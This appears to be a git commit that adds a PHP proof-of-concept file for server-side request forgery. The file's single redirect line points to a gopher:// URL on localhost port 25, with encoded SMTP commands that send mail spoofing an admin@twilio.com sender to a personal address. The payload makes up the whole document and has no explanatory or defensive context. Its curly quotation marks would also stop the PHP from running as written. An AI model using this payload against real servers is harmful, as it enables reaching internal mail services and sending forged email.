2ed0830f8050d0afd4bc384a5723d2b415d72fac
Roberto Nunes <46332131+Akokonunes@users.noreply.github.com>
2023-09-16 08:20:32 +0900

    Update and rename ssrf.html to ssrf.php

---
+++ poc/ssrf.php
@@ -0,0 +1,3 @@
+<?php
+header(‘location: gopher://127.0.0.1:25/_MAIL%20FROM:admin%40twilio.com%0ARCPT%20To:nunessjroberto%40gmail.com%0ADATA%0AFrom:admin%40twilio.com%0ASubject:SSRF%20TEST%0AMessage:SSRFF%20TEST%20GOPHER%0A.’);
+?>
